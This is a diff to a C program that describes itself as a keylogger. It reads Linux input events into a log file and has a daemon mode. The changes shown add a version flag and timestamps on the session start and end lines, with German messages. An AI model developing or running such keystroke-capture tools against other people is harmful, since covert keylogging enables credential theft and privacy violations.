@@ -12,6 +12,9 @@
 #include <sys/types.h>
 #include <ctype.h>
 #include <errno.h>
+#include <time.h>
+
+#define VERSION "1.1"
 
 // Globale Variablen für Signal-Handling
 volatile sig_atomic_t running = 1;
@@ -24,7 +27,11 @@ void handle_signal(int signum) {
 
 void cleanup() {
     if (logfile) {
-        fprintf(logfile, "\n=== Session beendet ===\n");
+        time_t t = time(NULL);
+        struct tm tm = *localtime(&t);
+        fprintf(logfile, "\n=== Session beendet: %02d.%02d.%02d %02d:%02d:%02d ===\n", 
+                tm.tm_mday, tm.tm_mon + 1, tm.tm_year % 100, 
+                tm.tm_hour, tm.tm_min, tm.tm_sec);
         fclose(logfile);
         logfile = NULL;
     }
@@ -244,6 +251,9 @@ int main(int argc, char *argv[]) {
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--daemon") == 0) {
             daemon_mode = 1;
+        } else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--version") == 0) {
+            printf("Keylogger Version: "VERSION"\n");
+            return 0;
         } else if (argv[i][0] != '-') {
             if (positional_args < 2) {
                 pos_args[positional_args++] = argv[i];
@@ -305,7 +315,11 @@ int main(int argc, char *argv[]) {
         printf("Keylogger gestartet. Schreibe in %s\nDrücke Strg+C zum Beenden.\n", logfilepath);
     }
     
-    fprintf(logfile, "\n=== Session gestartet ===\n");
+    time_t t = time(NULL);
+    struct tm tm = *localtime(&t);
+    fprintf(logfile, "\n=== Session gestartet: %02d.%02d.%02d %02d:%02d:%02d ===\n",
+            tm.tm_mday, tm.tm_mon + 1, tm.tm_year % 100,
+            tm.tm_hour, tm.tm_min, tm.tm_sec);
     fflush(logfile);
 
     struct input_event inputevent;
